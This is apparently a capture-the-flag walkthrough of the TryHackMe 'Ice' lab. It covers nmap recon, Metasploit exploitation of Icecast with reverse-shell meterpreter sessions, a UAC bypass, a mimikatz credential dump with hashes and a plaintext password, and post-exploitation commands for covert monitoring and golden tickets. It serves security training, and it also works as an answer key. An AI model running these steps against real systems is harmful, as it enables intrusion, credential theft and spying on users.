# TryHackMe [Ice](https://www.tryhackme.com/room/ice)
## Recon
### Launch a scan against our target machine
```
$ sudo nmap -sS -sV <MACHINE_IP>
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-20 19:23 AEST
Nmap scan report for <MACHINE_IP>
Host is up (0.32s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http         Icecast streaming media server
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.04 seconds
```
### What port is Microsoft Remote Desktop open on?
**Answer**: `3389`
### What service did nmap identify as running on port 8000?
**Answer**: `Icecast`
### What does Nmap identify as the hostname of the machine?
**Answer**: `DARK-PC`
## Gain Access
### What type of vulnerability is it (according to https://www.cvedetails.com)?
* https://www.cvedetails.com/cve/CVE-2004-1561/

**Answer**: `Execute Code Overflow`
### What is the CVE number for this vulnerability?
**Answer**: `CVE-2004-1561`
### What is the full path (starting with exploit) for the Metasploit exploitation module?
```
msf6 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/icecast_header
```
**Answer**: `exploit/windows/http/icecast_header`
### What is the only required setting which currently is blank?
```
msf6 exploit(windows/http/icecast_header) > show options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
**Answer**: `RHOSTS`
## Escalate
### What's the name of the shell we have now?
```
msf6 exploit(windows/http/icecast_header) > set RHOSTS <MACHINE_IP>
RHOSTS => <MACHINE_IP>
msf6 exploit(windows/http/icecast_header) > set LHOST tun0
LHOST => <OPENVPN_IP>
msf6 exploit(windows/http/icecast_header) > exploit 

[*] Started reverse TCP handler on <OPENVPN_IP>:4444 
[*] Sending stage (175174 bytes) to <MACHINE_IP>
[*] Meterpreter session 1 opened (<OPENVPN_IP>:4444 -> <MACHINE_IP>:49197) at 2021-04-20 19:39:24 +1000

meterpreter > sysinfo
```
**Answer**: `meterpreter`
### What user was running that Icecast process?
```
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 144   2676  WinSAT.exe            x64   1
 416   4     smss.exe
 500   692   svchost.exe
 544   536   csrss.exe
 588   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1008  816   WmiPrvSE.exe
 1016  692   svchost.exe
 1020  692   vds.exe
 1052  692   svchost.exe
 1188  692   svchost.exe
 1292  692   sppsvc.exe
 1300  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1368  692   spoolsv.exe
 1396  692   svchost.exe
 1452  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1564  692   amazon-ssm-agent.exe
 1640  692   LiteAgent.exe
 1680  692   svchost.exe
 1820  692   Ec2Config.exe
 2036  500   Defrag.exe
 2060  692   svchost.exe
 2280  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2472  544   conhost.exe
 2480  692   TrustedInstaller.exe
 2576  692   SearchIndexer.exe
 2640  604   conhost.exe           x64   1
 2676  692   taskhost.exe          x64   1
 2716  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
 2744  2716  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
```
**Answer**: `Dark`
### What build of Windows is the system?
```
meterpreter > sysinfo 
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```
**Answer**: `7601`
### What is the architecture of the process we're running?
**Answer**: `x64`
###  What is the full path for the first returned exploit from the local exploit suggester?
```
meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.170.20 - Collecting local exploits for x86/windows...
[*] 10.10.170.20 - 37 exploit checks are being tried...
[+] 10.10.170.20 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.170.20 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
**Answer**: `exploit/windows/local/bypassuac_eventvwr`
### What is the name of the incorrect option for `exploit/windows/local/bypassuac_eventvwr`?
```
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(windows/http/icecast_header) > use exploit/windows/local/bypassuac_eventvwr
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/bypassuac_eventvwr) > set session 1
session => 1
msf6 exploit(windows/local/bypassuac_eventvwr) > show options 

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.12     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86
```
**Answer**: `LHOST`
### What permission listed by `getprivs` allows us to take ownership of files?
```
msf6 exploit(windows/local/bypassuac_eventvwr) > set LHOST tun0
LHOST => <OPENVPN_IP>
msf6 exploit(windows/local/bypassuac_eventvwr) > run

[*] Started reverse TCP handler on <OPENVPN_IP>:4444 
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Configuring payload and stager registry keys ...
[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe
[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
[*] Sending stage (175174 bytes) to 10.10.170.20
[*] Meterpreter session 2 opened (<OPENVPN_IP>:4444 -> 10.10.170.20:49215) at 2021-04-20 19:54:34 +1000
[*] Cleaning up registry keys ...

meterpreter > sessions 
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sessions -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sessions 2
[*] Session 2 is already interactive.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```
**Answer**: `SeTakeOwnershipPrivilege`
## Looting
### What's the name of the printer spool service?
```
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User                          Path
 ---   ----  ----                    ----  -------  ----                          ----
 1368  692   spoolsv.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

```
**Answer**: `spoolsv.exe`
### What user is listed by `getuid`?
```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1432 to 1368...
[*] Migration completed successfully.
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
**Answer**: `NT AUTHORITY\SYSTEM`
### Which `kiwi` command allows up to retrieve all credentials?
```
meterpreter > migrate -N spoolsv.exe
[*] Migrating from 1432 to 1368...
[*] Migration completed successfully.
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > help
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
```
**Answer**: `creds_all`
### What is Dark's password? 
```
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```
**Answer**: `Password01!`
### What command allows us to dump all of the password hashes stored on the system?
```
meterpreter > help
Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database
```
## Post-Exploitation
**Answer**: `hashdump`
### what command allows us to watch the remote user's desktop in real time?
```
meterpreter > help
Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    screenshare    Watch the remote user desktop in real time
```
**Answer**: `screenshare`
### How about if we wanted to record from a microphone attached to the system?
```
meterpreter > help
Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
```
**Answer**: `record_mic`
### What command allows us to modify timestamps of files on the system?
```
meterpreter > help
Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes
```
**Answer**: `timestomp`
### What command allows us to get a "golden ticket"?
```
meterpreter > help
Kiwi Commands
=============

    Command                Description
    -------                -----------
    golden_ticket_create   Create a golden kerberos ticket
```
**Answer**: `golden_ticket_create`